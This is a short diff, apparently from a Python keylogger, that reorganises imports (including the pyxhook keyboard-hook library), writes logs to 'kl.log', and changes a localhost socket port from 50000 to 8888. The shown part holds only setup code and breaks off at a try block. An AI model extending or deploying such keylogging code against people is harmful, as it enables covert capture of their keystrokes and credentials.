@@ -1,10 +1,17 @@
-import pyxhook,time,socket,logging,os,pwd,datetime
+import time 
+import socket
+import logging
+import os 
+import pwd
+import datetime
+
+from Hook import pyxhook
 
 logging.basicConfig(filename="kl.log",level=logging.DEBUG)
 logger=logging.getLogger(__name__)
 
 host = 'localhost'
-port = 50000
+port = 8888
 size = 1024
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
